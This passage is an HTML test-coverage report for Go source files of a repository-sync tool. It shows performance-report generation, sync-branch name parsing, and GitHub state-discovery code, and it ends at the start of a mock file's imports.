// analyzeRegressions generates recommendations for performance regressions
func (pr *PerformanceReporter) analyzeRegressions(report *PerformanceReport) []Recommendation <span class="cov8" title="1">{
        recommendations := make([]Recommendation, 0, len(report.Regressions))

        for metric, regression := range report.Regressions </span><span class="cov8" title="1">{
                priority := PriorityMedium
                if regression &gt; 25 </span><span class="cov8" title="1">{
                        priority = PriorityHigh
                }</span> else<span class="cov8" title="1"> if regression &lt; 10 </span><span class="cov8" title="1">{
                        priority = PriorityLow
                }</span>

                <span class="cov8" title="1">recommendations = append(recommendations, Recommendation{
                        ID:          fmt.Sprintf("regression-%s", strings.ReplaceAll(metric, "_", "-")),
                        Priority:    priority,
                        Category:    "Performance Regression",
                        Title:       fmt.Sprintf("Performance Regression in %s", formatMetricName(metric)),
                        Description: fmt.Sprintf("Performance has regressed by %.1f%% for %s", regression, metric),
                        Action:      "Review recent changes and profile the affected code path",
                        Impact:      "Performance regression may affect user experience and system throughput",
                        Evidence:    []string{fmt.Sprintf("Regression: %.1f%%", regression)},
                })</span>
        }

        <span class="cov8" title="1">return recommendations</span>
}

// analyzeTestFailures generates recommendations for test failures
func (pr *PerformanceReporter) analyzeTestFailures(report *PerformanceReport) []Recommendation <span class="cov8" title="1">{
        var recommendations []Recommendation

        if report.FailedTests &gt; 0 </span><span class="cov8" title="1">{
                failureRate := float64(report.FailedTests) / float64(report.TotalTests) * 100

                priority := PriorityMedium
                if failureRate &gt; 20 </span><span class="cov8" title="1">{
                        priority = PriorityHigh
                }</span>

                <span class="cov8" title="1">var failedTestNames []string
                for _, test := range report.TestResults </span><span class="cov8" title="1">{
                        if !test.Success </span><span class="cov8" title="1">{
                                failedTestNames = append(failedTestNames, test.Name)
                        }</span>
                }

                <span class="cov8" title="1">recommendations = append(recommendations, Recommendation{
                        ID:          "test-failures",
                        Priority:    priority,
                        Category:    "Test Failures",
                        Title:       "Performance Test Failures",
                        Description: fmt.Sprintf("%d out of %d tests failed (%.1f%% failure rate)", report.FailedTests, report.TotalTests, failureRate),
                        Action:      "Investigate and fix failing performance tests",
                        Impact:      "Test failures may indicate performance degradation or infrastructure issues",
                        Evidence:    append([]string{fmt.Sprintf("Failed tests: %d/%d", report.FailedTests, report.TotalTests)}, failedTestNames...),
                })</span>
        }

        <span class="cov8" title="1">return recommendations</span>
}

// analyzeProfiles generates recommendations based on profiling data
func (pr *PerformanceReporter) analyzeProfiles(report *PerformanceReport) []Recommendation <span class="cov8" title="1">{
        var recommendations []Recommendation

        // Check if profiles are unusually large
        if report.ProfileSummary.TotalProfileSize &gt; 100*1024*1024 </span><span class="cov8" title="1">{ // 100MB
                recommendations = append(recommendations, Recommendation{
                        ID:          "large-profiles",
                        Priority:    PriorityLow,
                        Category:    "Profiling",
                        Title:       "Large Profile Files",
                        Description: fmt.Sprintf("Profile files are large (%.1f MB total)", float64(report.ProfileSummary.TotalProfileSize)/(1024*1024)),
                        Action:      "Consider reducing profiling duration or sample rate",
                        Impact:      "Large profile files may consume significant disk space",
                        Evidence:    []string{fmt.Sprintf("Total profile size: %.1f MB", float64(report.ProfileSummary.TotalProfileSize)/(1024*1024))},
                })
        }</span>

        <span class="cov8" title="1">return recommendations</span>
}

// SaveReport saves the report in the configured formats
func (pr *PerformanceReporter) SaveReport(report *PerformanceReport) error <span class="cov8" title="1">{
        if err := os.MkdirAll(pr.config.OutputDirectory, 0o750); err != nil </span><span class="cov0" title="0">{
                return fmt.Errorf("failed to create output directory: %w", err)
        }</span>

        <span class="cov8" title="1">baseFileName := fmt.Sprintf("performance_report_%s", report.ReportID)

        // Save JSON report
        if pr.config.GenerateJSON </span><span class="cov8" title="1">{
                if err := pr.saveJSONReport(report, filepath.Join(pr.config.OutputDirectory, baseFileName+".json")); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to save JSON report: %w", err)
                }</span>
        }

        // Save Markdown report
        <span class="cov8" title="1">if pr.config.GenerateMarkdown </span><span class="cov8" title="1">{
                if err := pr.saveMarkdownReport(report, filepath.Join(pr.config.OutputDirectory, baseFileName+".md")); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to save Markdown report: %w", err)
                }</span>
        }

        // Save HTML report
        <span class="cov8" title="1">if pr.config.GenerateHTML </span><span class="cov8" title="1">{
                if err := pr.saveHTMLReport(report, filepath.Join(pr.config.OutputDirectory, baseFileName+".html")); err != nil </span><span class="cov0" title="0">{
                        return fmt.Errorf("failed to save HTML report: %w", err)
                }</span>
        }

        <span class="cov8" title="1">return nil</span>
}

// saveJSONReport saves the report as JSON
func (pr *PerformanceReporter) saveJSONReport(report *PerformanceReport, filename string) error <span class="cov8" title="1">{
        data, err := json.MarshalIndent(report, "", "  ")
        if err != nil </span><span class="cov0" title="0">{
                return err
        }</span>

        <span class="cov8" title="1">return os.WriteFile(filename, data, 0o600)</span>
}

// saveMarkdownReport saves the report as Markdown
func (pr *PerformanceReporter) saveMarkdownReport(report *PerformanceReport, filename string) error <span class="cov8" title="1">{
        tmpl := template.Must(template.New("markdown").Funcs(pr.getTemplateFuncs()).Parse(markdownTemplate))

        file, err := os.Create(filename) //nolint:gosec // Creating output report file
        if err != nil </span><span class="cov0" title="0">{
                return err
        }</span>
        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{ _ = file.Close() }</span>() // Ignore error in defer

        <span class="cov8" title="1">return tmpl.Execute(file, report)</span>
}

// saveHTMLReport saves the report as HTML
func (pr *PerformanceReporter) saveHTMLReport(report *PerformanceReport, filename string) error <span class="cov8" title="1">{
        tmpl := template.Must(template.New("html").Funcs(pr.getTemplateFuncs()).Parse(htmlTemplate))

        file, err := os.Create(filename) //nolint:gosec // Creating output report file
        if err != nil </span><span class="cov0" title="0">{
                return err
        }</span>
        <span class="cov8" title="1">defer func() </span><span class="cov8" title="1">{ _ = file.Close() }</span>() // Ignore error in defer

        <span class="cov8" title="1">return tmpl.Execute(file, report)</span>
}

// Helper functions

func generateReportID() string <span class="cov8" title="1">{
        return fmt.Sprintf("%d", time.Now().Unix())
}</span>

func getSystemInfo() SystemInfo <span class="cov8" title="1">{
        return SystemInfo{
                GoVersion:  runtime.Version(),
                GOOS:       runtime.GOOS,
                GOARCH:     runtime.GOARCH,
                NumCPU:     runtime.NumCPU(),
                GOMAXPROCS: runtime.GOMAXPROCS(-1),
                Timestamp:  time.Now(),
        }
}</span>

func isLowerBetterMetric(metric string) bool <span class="cov8" title="1">{
        lowerBetterMetrics := []string{
                "duration", "latency", "memory", "allocation", "gc_pause", "response_time",
        }

        for _, lbm := range lowerBetterMetrics </span><span class="cov8" title="1">{
                if strings.Contains(strings.ToLower(metric), lbm) </span><span class="cov8" title="1">{
                        return true
                }</span>
        }
        <span class="cov8" title="1">return false</span>
}

func isHigherBetterMetric(metric string) bool <span class="cov8" title="1">{
        higherBetterMetrics := []string{
                "throughput", "ops_per_sec", "requests_per_sec", "performance", "speed",
        }

        for _, hbm := range higherBetterMetrics </span><span class="cov8" title="1">{
                if strings.Contains(strings.ToLower(metric), hbm) </span><span class="cov8" title="1">{
                        return true
                }</span>
        }
        <span class="cov8" title="1">return false</span>
}

func formatMetricName(metric string) string <span class="cov8" title="1">{
        // Convert snake_case to Title Case
        parts := strings.Split(metric, "_")
        for i, part := range parts </span><span class="cov8" title="1">{
                if len(part) &gt; 0 </span><span class="cov8" title="1">{
                        parts[i] = strings.ToUpper(part[:1]) + strings.ToLower(part[1:])
                }</span>
        }
        <span class="cov8" title="1">return strings.Join(parts, " ")</span>
}

func abs(x float64) float64 <span class="cov8" title="1">{
        if x &lt; 0 </span><span class="cov8" title="1">{
                return -x
        }</span>
        <span class="cov8" title="1">return x</span>
}

// getTemplateFuncs returns template functions for report generation
func (pr *PerformanceReporter) getTemplateFuncs() template.FuncMap <span class="cov8" title="1">{
        return template.FuncMap{
                "formatFloat": func(f float64) string </span><span class="cov8" title="1">{
                        return fmt.Sprintf("%.2f", f)
                }</span>,
                "formatPercent": func(f float64) string <span class="cov8" title="1">{
                        return fmt.Sprintf("%.1f%%", f)
                }</span>,
                "formatBytes": func(bytes int64) string <span class="cov8" title="1">{
                        const unit = 1024
                        if bytes &lt; unit </span><span class="cov8" title="1">{
                                return fmt.Sprintf("%d B", bytes)
                        }</span>
                        <span class="cov8" title="1">div, exp := int64(unit), 0
                        for n := bytes / unit; n &gt;= unit; n /= unit </span><span class="cov8" title="1">{
                                div *= unit
                                exp++
                        }</span>
                        <span class="cov8" title="1">return fmt.Sprintf("%.1f %cB", float64(bytes)/float64(div), "KMGTPE"[exp])</span>
                },
                "title": func(v interface{}) string <span class="cov8" title="1">{
                        s := fmt.Sprintf("%v", v)
                        if len(s) == 0 </span><span class="cov8" title="1">{
                                return s
                        }</span>
                        <span class="cov8" title="1">return strings.ToUpper(s[:1]) + strings.ToLower(s[1:])</span>
                },
                "priorityClass": func(priority RecommendationPriority) string <span class="cov8" title="1">{
                        switch priority </span>{
                        case PriorityHigh:<span class="cov8" title="1">
                                return "priority-high"</span>
                        case PriorityMedium:<span class="cov8" title="1">
                                return "priority-medium"</span>
                        case PriorityLow:<span class="cov8" title="1">
                                return "priority-low"</span>
                        default:<span class="cov8" title="1">
                                return ""</span>
                        }
                },
        }
}
</pre>

		<pre class="file" id="file48" style="display: none">package state

import (
        "errors"
        "fmt"
        "regexp"
        "time"
)

// Branch validation errors
var (
        ErrBranchPrefixEmpty   = errors.New("branch prefix cannot be empty")
        ErrBranchPrefixInvalid = errors.New("branch prefix contains invalid characters")
        ErrNotSyncBranch       = errors.New("not a sync branch")
)

// parseSyncBranchName parses a branch name to extract sync metadata
func parseSyncBranchName(name string) (*BranchMetadata, error) <span class="cov8" title="1">{
        // Legacy support for hardcoded chore/sync-files prefix
        return parseSyncBranchNameWithPrefix(name, "chore/sync-files")
}</span>

// parseSyncBranchNameWithPrefix parses a branch name with a specific prefix to extract sync metadata
func parseSyncBranchNameWithPrefix(name, prefix string) (*BranchMetadata, error) <span class="cov8" title="1">{
        // Create pattern for the given prefix: prefix-YYYYMMDD-HHMMSS-{commit}
        escapedPrefix := regexp.QuoteMeta(prefix)
        pattern := fmt.Sprintf(`^(%s)-(\d{8})-(\d{6})-([a-fA-F0-9]+)$`, escapedPrefix)
        branchPattern := regexp.MustCompile(pattern)

        matches := branchPattern.FindStringSubmatch(name)
        if matches == nil </span><span class="cov8" title="1">{
                // Not a sync branch
                return nil, ErrNotSyncBranch
        }</span>

        // Extract components
        <span class="cov8" title="1">extractedPrefix := matches[1]
        dateStr := matches[2]
        timeStr := matches[3]
        commitSHA := matches[4]

        // Parse timestamp
        timestampStr := fmt.Sprintf("%s%s", dateStr, timeStr)

        timestamp, err := time.Parse("20060102150405", timestampStr)
        if err != nil </span><span class="cov0" title="0">{
                return nil, fmt.Errorf("failed to parse timestamp from branch name %s: %w", name, err)
        }</span>

        <span class="cov8" title="1">return &amp;BranchMetadata{
                Timestamp: timestamp,
                CommitSHA: commitSHA,
                Prefix:    extractedPrefix,
        }, nil</span>
}

// FormatSyncBranchName creates a sync branch name from metadata
func FormatSyncBranchName(prefix string, timestamp time.Time, commitSHA string) string <span class="cov8" title="1">{
        return fmt.Sprintf("%s-%s-%s",
                prefix,
                timestamp.Format("20060102-150405"),
                commitSHA,
        )
}</span>

// ValidateBranchPrefix checks if a branch prefix is valid
func ValidateBranchPrefix(prefix string) error <span class="cov8" title="1">{
        if prefix == "" </span><span class="cov8" title="1">{
                return ErrBranchPrefixEmpty
        }</span>

        // Check for invalid characters
        <span class="cov8" title="1">invalidChars := regexp.MustCompile(`[^a-zA-Z0-9/_-]`)
        if invalidChars.MatchString(prefix) </span><span class="cov8" title="1">{
                return ErrBranchPrefixInvalid
        }</span>

        <span class="cov8" title="1">return nil</span>
}
</pre>

		<pre class="file" id="file49" style="display: none">package state

import (
        "context"
        "errors"
        "fmt"
        "strings"
        "time"

        "github.com/sirupsen/logrus"

        "github.com/mrz1836/go-broadcast/internal/config"
        "github.com/mrz1836/go-broadcast/internal/gh"
        "github.com/mrz1836/go-broadcast/internal/logging"
)

// ErrNoGroupsFound indicates no groups were found in configuration
var ErrNoGroupsFound = errors.New("no groups found in configuration")

// discoveryService implements the Discoverer interface
type discoveryService struct {
        gh        gh.Client
        logger    *logrus.Logger
        logConfig *logging.LogConfig
}

// NewDiscoverer creates a new state discoverer.
//
// Parameters:
// - ghClient: GitHub client for API operations
// - logger: Logger instance for general logging
// - logConfig: Configuration for debug logging and verbose settings
//
// Returns:
// - Discoverer interface implementation for state discovery operations
func NewDiscoverer(ghClient gh.Client, logger *logrus.Logger, logConfig *logging.LogConfig) Discoverer <span class="cov8" title="1">{
        return &amp;discoveryService{
                gh:        ghClient,
                logger:    logger,
                logConfig: logConfig,
        }
}</span>

// DiscoverState discovers the complete sync state by examining GitHub with comprehensive debug logging support.
//
// This method provides detailed visibility into state discovery when debug logging is enabled,
// including source repository analysis, target repository scanning, timing metrics, and state correlation.
// Updated to work with both legacy and group-based configurations.
//
// Parameters:
// - ctx: Context for cancellation and timeout control
// - cfg: Configuration containing source and target repository information
//
// Returns:
// - Complete sync state information
// - Error if discovery fails
//
// Side Effects:
// - Logs detailed discovery progress when --debug-state flag is enabled
// - Records discovery timing and repository analysis metrics
func (d *discoveryService) DiscoverState(ctx context.Context, cfg *config.Config) (*State, error) <span class="cov8" title="1">{
        logger := logging.WithStandardFields(d.logger, d.logConfig, logging.ComponentNames.State)
        start := time.Now()

        // Work directly with groups - no compatibility layer needed
        if len(cfg.Groups) == 0 </span><span class="cov0" title="0">{
                return nil, ErrNoGroupsFound
        }</span>
        <span class="cov8" title="1">groups := cfg.Groups

        // For Phase 2a, use first group (single group support)
        // Future phases will support multiple groups
        group := groups[0]

        // Debug logging when --debug-state flag is enabled
        if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                logger.WithFields(logrus.Fields{
                        logging.StandardFields.Operation:   logging.OperationTypes.StateDiscover,
                        logging.StandardFields.SourceRepo:  group.Source.Repo,
                        logging.StandardFields.BranchName:  group.Source.Branch,
                        logging.StandardFields.TargetCount: len(group.Targets),
                        "group_name":                       group.Name,
                        "group_id":                         group.ID,
                }).Debug("Starting sync state discovery")
        }</span> else<span class="cov8" title="1"> {
                d.logger.Info("Discovering sync state from GitHub")
        }</span>

        // Check for context cancellation
        <span class="cov8" title="1">select </span>{
        case &lt;-ctx.Done():<span class="cov8" title="1">
                return nil, fmt.Errorf("state discovery canceled: %w", ctx.Err())</span>
        default:<span class="cov8" title="1"></span>
        }

        <span class="cov8" title="1">state := &amp;State{
                Source: SourceState{
                        Repo:        group.Source.Repo,
                        Branch:      group.Source.Branch,
                        LastChecked: time.Now(),
                },
                Targets: make(map[string]*TargetState),
        }

        // Get source repository latest commit
        if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                logger.WithFields(logrus.Fields{
                        logging.StandardFields.RepoName:   group.Source.Repo,
                        logging.StandardFields.BranchName: group.Source.Branch,
                }).Debug("Discovering source repository state")
        }</span>

        <span class="cov8" title="1">sourceStart := time.Now()
        sourceBranch, err := d.gh.GetBranch(ctx, group.Source.Repo, group.Source.Branch)
        sourceDuration := time.Since(sourceStart)

        if err != nil </span><span class="cov8" title="1">{
                if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                        logger.WithFields(logrus.Fields{
                                logging.StandardFields.RepoName:   group.Source.Repo,
                                logging.StandardFields.BranchName: group.Source.Branch,
                                logging.StandardFields.Error:      err.Error(),
                                logging.StandardFields.DurationMs: sourceDuration.Milliseconds(),
                                logging.StandardFields.Status:     "failed",
                        }).Error("Failed to get source branch information")
                }</span>
                <span class="cov8" title="1">return nil, fmt.Errorf("failed to get source branch: %w", err)</span>
        }

        <span class="cov8" title="1">if sourceBranch != nil </span><span class="cov8" title="1">{
                state.Source.LatestCommit = sourceBranch.Commit.SHA

                if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                        logger.WithFields(logrus.Fields{
                                logging.StandardFields.RepoName:   group.Source.Repo,
                                logging.StandardFields.BranchName: group.Source.Branch,
                                logging.StandardFields.CommitSHA:  state.Source.LatestCommit,
                                logging.StandardFields.DurationMs: sourceDuration.Milliseconds(),
                                logging.StandardFields.Status:     "discovered",
                        }).Debug("Source repository state discovered")
                }</span>
        } else<span class="cov0" title="0"> {
                if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov0" title="0">{
                        logger.WithField("repo", group.Source.Repo).Warn("Source branch information not available")
                }</span>
        }

        // Discover state for each target repository using group targets
        <span class="cov8" title="1">if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                logger.WithField(logging.StandardFields.TargetCount, len(group.Targets)).Debug("Starting target repository discovery")
        }</span>

        <span class="cov8" title="1">targetStates := make(map[string]*TargetState)
        for i, target := range group.Targets </span><span class="cov8" title="1">{
                // Check for context cancellation
                select </span>{
                case &lt;-ctx.Done():<span class="cov8" title="1">
                        return nil, fmt.Errorf("target discovery canceled: %w", ctx.Err())</span>
                default:<span class="cov8" title="1"></span>
                }

                <span class="cov8" title="1">targetLogger := logger
                if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                        targetLogger = logger.WithFields(logrus.Fields{
                                "target_index":                    i,
                                logging.StandardFields.TargetRepo: target.Repo,
                        })
                        targetLogger.Trace("Discovering target repository state")
                }</span> else<span class="cov8" title="1"> {
                        d.logger.WithField("repo", target.Repo).Debug("Discovering target state")
                }</span>

                <span class="cov8" title="1">targetStart := time.Now()
                branchPrefix := group.Defaults.BranchPrefix
                if branchPrefix == "" </span><span class="cov0" title="0">{
                        branchPrefix = "chore/sync-files" // Default fallback
                }</span>
                <span class="cov8" title="1">targetState, err := d.DiscoverTargetState(ctx, target.Repo, branchPrefix)
                targetDuration := time.Since(targetStart)

                if err != nil </span><span class="cov8" title="1">{
                        if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                                targetLogger.WithFields(logrus.Fields{
                                        logging.StandardFields.Error:      err.Error(),
                                        logging.StandardFields.DurationMs: targetDuration.Milliseconds(),
                                        logging.StandardFields.Status:     "failed",
                                }).Error("Failed to discover target repository state")
                        }</span>
                        <span class="cov8" title="1">return nil, fmt.Errorf("failed to discover state for %s: %w", target.Repo, err)</span>
                }

                // Determine sync status based on source and target state
                <span class="cov8" title="1">targetState.Status = d.determineSyncStatus(state.Source, targetState)

                if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                        targetLogger.WithFields(logrus.Fields{
                                "sync_branches":                   len(targetState.SyncBranches),
                                "open_prs":                        len(targetState.OpenPRs),
                                "last_sync_commit":                targetState.LastSyncCommit,
                                logging.StandardFields.SyncStatus: string(targetState.Status),
                                logging.StandardFields.DurationMs: targetDuration.Milliseconds(),
                                logging.StandardFields.Status:     "discovered",
                        }).Debug("Target repository state discovered")
                }</span>

                <span class="cov8" title="1">targetStates[target.Repo] = targetState</span>
        }

        <span class="cov8" title="1">state.Targets = targetStates

        // Log successful discovery completion
        duration := time.Since(start)
        if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                logger.WithFields(logrus.Fields{
                        logging.StandardFields.DurationMs: duration.Milliseconds(),
                        "targets_discovered":              len(state.Targets),
                        logging.StandardFields.CommitSHA:  state.Source.LatestCommit,
                        logging.StandardFields.Status:     "completed",
                }).Debug("Sync state discovery completed successfully")
        }</span>

        <span class="cov8" title="1">return state, nil</span>
}

// DiscoverTargetState discovers the state of a specific target repository with comprehensive debug logging support.
//
// This method provides detailed visibility into target repository analysis when debug logging is enabled,
// including branch discovery, sync branch parsing, PR detection, and timing metrics.
//
// Parameters:
// - ctx: Context for cancellation and timeout control
// - repo: Target repository name to analyze
// - branchPrefix: The branch prefix to use for sync branch detection
//
// Returns:
// - Target repository state information
// - Error if discovery fails
//
// Side Effects:
// - Logs detailed target analysis progress when --debug-state flag is enabled
// - Records API call timing and branch analysis metrics
func (d *discoveryService) DiscoverTargetState(ctx context.Context, repo, branchPrefix string) (*TargetState, error) <span class="cov8" title="1">{
        logger := logging.WithStandardFields(d.logger, d.logConfig, "target-discovery")
        logger = logger.WithField(logging.StandardFields.TargetRepo, repo)
        start := time.Now()

        // Debug logging when --debug-state flag is enabled
        if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                logger.Debug("Starting target repository state discovery")
        }</span>

        // Check for context cancellation
        <span class="cov8" title="1">select </span>{
        case &lt;-ctx.Done():<span class="cov8" title="1">
                return nil, fmt.Errorf("target discovery canceled: %w", ctx.Err())</span>
        default:<span class="cov8" title="1"></span>
        }

        <span class="cov8" title="1">targetState := &amp;TargetState{
                Repo:         repo,
                SyncBranches: []SyncBranch{},
                OpenPRs:      []gh.PR{},
                Status:       StatusUnknown,
        }

        // List all branches to find sync branches
        if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                logger.Debug("Listing branches to find sync branches")
        }</span>

        <span class="cov8" title="1">branchStart := time.Now()
        branches, err := d.gh.ListBranches(ctx, repo)
        branchDuration := time.Since(branchStart)

        if err != nil </span><span class="cov8" title="1">{
                if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                        logger.WithFields(logrus.Fields{
                                logging.StandardFields.Error:      err.Error(),
                                logging.StandardFields.DurationMs: branchDuration.Milliseconds(),
                                logging.StandardFields.Status:     "failed",
                        }).Error("Failed to list branches")
                }</span>
                <span class="cov8" title="1">return nil, fmt.Errorf("failed to list branches: %w", err)</span>
        }

        <span class="cov8" title="1">if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                logger.WithFields(logrus.Fields{
                        "branch_count":                    len(branches),
                        logging.StandardFields.DurationMs: branchDuration.Milliseconds(),
                        logging.StandardFields.Status:     "success",
                }).Debug("Successfully listed branches")
        }</span>

        // Find and parse sync branches
        <span class="cov8" title="1">if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                logger.Debug("Analyzing branches for sync patterns")
        }</span>

        <span class="cov8" title="1">syncBranchCount := 0
        syncBranchPrefix := branchPrefix + "-"
        for _, branch := range branches </span><span class="cov8" title="1">{
                if strings.HasPrefix(branch.Name, syncBranchPrefix) </span><span class="cov8" title="1">{
                        syncBranchCount++

                        if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                                logger.WithField(logging.StandardFields.BranchName, branch.Name).Trace("Found potential sync branch")
                        }</span>

                        <span class="cov8" title="1">metadata, parseErr := d.ParseBranchNameWithPrefix(branch.Name, branchPrefix)
                        if parseErr != nil </span><span class="cov8" title="1">{
                                if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                                        logger.WithFields(logrus.Fields{
                                                logging.StandardFields.BranchName: branch.Name,
                                                logging.StandardFields.Error:      parseErr.Error(),
                                                logging.StandardFields.Status:     "parse_failed",
                                        }).Warn("Failed to parse sync branch metadata")
                                }</span> else<span class="cov8" title="1"> {
                                        d.logger.WithError(parseErr).WithField("branch", branch.Name).Warn("Failed to parse sync branch")
                                }</span>
                                <span class="cov8" title="1">continue</span>
                        }

                        <span class="cov8" title="1">if metadata != nil </span><span class="cov8" title="1">{
                                targetState.SyncBranches = append(targetState.SyncBranches, SyncBranch{
                                        Name:     branch.Name,
                                        Metadata: metadata,
                                })

                                if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                                        logger.WithFields(logrus.Fields{
                                                logging.StandardFields.BranchName: branch.Name,
                                                logging.StandardFields.CommitSHA:  metadata.CommitSHA,
                                                logging.StandardFields.Timestamp:  metadata.Timestamp,
                                                logging.StandardFields.Status:     "parsed",
                                        }).Trace("Successfully parsed sync branch")
                                }</span>
                        }
                }
        }

        <span class="cov8" title="1">if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                logger.WithFields(logrus.Fields{
                        "total_branches":          len(branches),
                        "potential_sync_branches": syncBranchCount,
                        "valid_sync_branches":     len(targetState.SyncBranches),
                }).Debug("Branch analysis completed")
        }</span>

        // Find the latest sync commit from branches
        <span class="cov8" title="1">if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                logger.Debug("Determining latest sync commit from branch metadata")
        }</span>

        <span class="cov8" title="1">var latestSyncTime *time.Time
        for _, syncBranch := range targetState.SyncBranches </span><span class="cov8" title="1">{
                if syncBranch.Metadata != nil </span><span class="cov8" title="1">{
                        if latestSyncTime == nil || syncBranch.Metadata.Timestamp.After(*latestSyncTime) </span><span class="cov8" title="1">{
                                latestSyncTime = &amp;syncBranch.Metadata.Timestamp
                                targetState.LastSyncCommit = syncBranch.Metadata.CommitSHA
                                targetState.LastSyncTime = latestSyncTime

                                if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                                        logger.WithFields(logrus.Fields{
                                                "latest_branch": syncBranch.Name,
                                                "commit_sha":    syncBranch.Metadata.CommitSHA,
                                                "sync_time":     syncBranch.Metadata.Timestamp,
                                        }).Trace("Updated latest sync commit")
                                }</span>
                        }
                }
        }

        <span class="cov8" title="1">if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                if latestSyncTime != nil </span><span class="cov8" title="1">{
                        logger.WithFields(logrus.Fields{
                                "last_sync_commit": targetState.LastSyncCommit,
                                "last_sync_time":   latestSyncTime,
                        }).Debug("Latest sync commit determined")
                }</span> else<span class="cov8" title="1"> {
                        logger.Debug("No sync history found in branches")
                }</span>
        }

        // List open PRs
        <span class="cov8" title="1">if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                logger.Debug("Listing open PRs to find sync-related PRs")
        }</span>

        <span class="cov8" title="1">prStart := time.Now()
        prs, err := d.gh.ListPRs(ctx, repo, "open")
        prDuration := time.Since(prStart)

        if err != nil </span><span class="cov8" title="1">{
                if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                        logger.WithFields(logrus.Fields{
                                "error":       err.Error(),
                                "duration_ms": prDuration.Milliseconds(),
                        }).Error("Failed to list open PRs")
                }</span>
                <span class="cov8" title="1">return nil, fmt.Errorf("failed to list PRs: %w", err)</span>
        }

        <span class="cov8" title="1">if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                logger.WithFields(logrus.Fields{
                        "total_prs":   len(prs),
                        "duration_ms": prDuration.Milliseconds(),
                }).Debug("Successfully listed open PRs")
        }</span>

        // Find sync-related PRs
        <span class="cov8" title="1">if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                logger.Debug("Analyzing PRs for sync patterns")
        }</span>

        <span class="cov8" title="1">syncPrCount := 0
        for _, pr := range prs </span><span class="cov8" title="1">{
                // Check if PR is from a sync branch
                if strings.HasPrefix(pr.Head.Ref, syncBranchPrefix) </span><span class="cov8" title="1">{
                        syncPrCount++
                        targetState.OpenPRs = append(targetState.OpenPRs, pr)

                        if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                                logger.WithFields(logrus.Fields{
                                        "pr_number":   pr.Number,
                                        "pr_title":    pr.Title,
                                        "head_branch": pr.Head.Ref,
                                }).Trace("Found sync-related PR")
                        }</span>
                }
        }

        <span class="cov8" title="1">if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                logger.WithFields(logrus.Fields{
                        "total_prs": len(prs),
                        "sync_prs":  len(targetState.OpenPRs),
                }).Debug("PR analysis completed")
        }</span>

        // Log successful discovery completion
        <span class="cov8" title="1">duration := time.Since(start)
        if d.logConfig != nil &amp;&amp; d.logConfig.Debug.State </span><span class="cov8" title="1">{
                logger.WithFields(logrus.Fields{
                        "duration_ms":      duration.Milliseconds(),
                        "sync_branches":    len(targetState.SyncBranches),
                        "open_sync_prs":    len(targetState.OpenPRs),
                        "last_sync_commit": targetState.LastSyncCommit,
                }).Debug("Target repository state discovery completed successfully")
        }</span>

        <span class="cov8" title="1">return targetState, nil</span>
}

// ParseBranchName parses a branch name to extract sync metadata
func (d *discoveryService) ParseBranchName(name string) (*BranchMetadata, error) <span class="cov8" title="1">{
        // This will be implemented in branch.go
        // For now, return a placeholder
        return parseSyncBranchName(name)
}</span>

// ParseBranchNameWithPrefix parses a branch name with a specific prefix to extract sync metadata
func (d *discoveryService) ParseBranchNameWithPrefix(name, branchPrefix string) (*BranchMetadata, error) <span class="cov8" title="1">{
        return parseSyncBranchNameWithPrefix(name, branchPrefix)
}</span>

// determineSyncStatus determines the sync status based on source and target state
func (d *discoveryService) determineSyncStatus(source SourceState, target *TargetState) SyncStatus <span class="cov8" title="1">{
        // No sync history
        if target.LastSyncCommit == "" </span><span class="cov8" title="1">{
                return StatusBehind
        }</span>

        // Has open PR - sync is pending
        <span class="cov8" title="1">if len(target.OpenPRs) &gt; 0 </span><span class="cov8" title="1">{
                return StatusPending
        }</span>

        // Check if target is up to date with source
        <span class="cov8" title="1">if target.LastSyncCommit == source.LatestCommit </span><span class="cov8" title="1">{
                return StatusUpToDate
        }</span>

        // Target is behind source
        <span class="cov8" title="1">return StatusBehind</span>
}
</pre>

		<pre class="file" id="file50" style="display: none">package state

import (
        "context"

        "github.com/stretchr/testify/mock"

        "github.com/mrz1836/go-broadcast/internal/config"
        "github.com/mrz1836/go-broadcast/internal/testutil"
)

